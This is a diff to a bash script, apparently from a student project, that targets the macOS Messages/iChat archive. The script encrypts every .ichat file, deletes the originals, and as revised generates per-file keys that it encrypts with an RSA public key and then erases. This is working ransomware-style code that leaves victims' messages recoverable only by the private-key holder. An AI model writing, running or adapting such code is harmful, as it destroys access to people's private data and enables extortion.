@@ -1,5 +1,5 @@
 #!/bin/bash
-PASS="630c4eac2642b0562b2f20548b0ae450"
+PUBKEY=~/Documents/CIS/433project/applescript/id_rsa.pub
 ARCHIVE=~/Library/Containers/com.apple.iChat/Data/Library/Messages/Archive
 MESSAGES=~/Library/Messages/Archive
 DPATH=''
@@ -15,10 +15,15 @@ if [ $? -eq 0 ]; then
 fi
 
 cd ${DPATH}
+mkdir keys
 
 find ./* -iname "*.ichat" | while read f
 do
-    openssl enc -aes-256-cbc -salt -in "${f}" -out "${f}.enc" -k $PASS
-    rm "${f}"
+    KEY=keys/$(basename "${f}").key
+    openssl rand 32 -out "$KEY"
+    openssl enc -aes-256-cbc -salt -in "${f}" -out "${f}.enc" -k file:"${KEY}"
+    openssl rsautl -encrypt -pubin -inkey <(ssh-keygen -e -f "${PUBKEY}" -m PKCS8) -in "$KEY" -out "${KEY}.enc" #encrypt key
+    rm "$KEY" #delete plaintext key
+    rm "${f}" #delete plaintext archive
 done
 
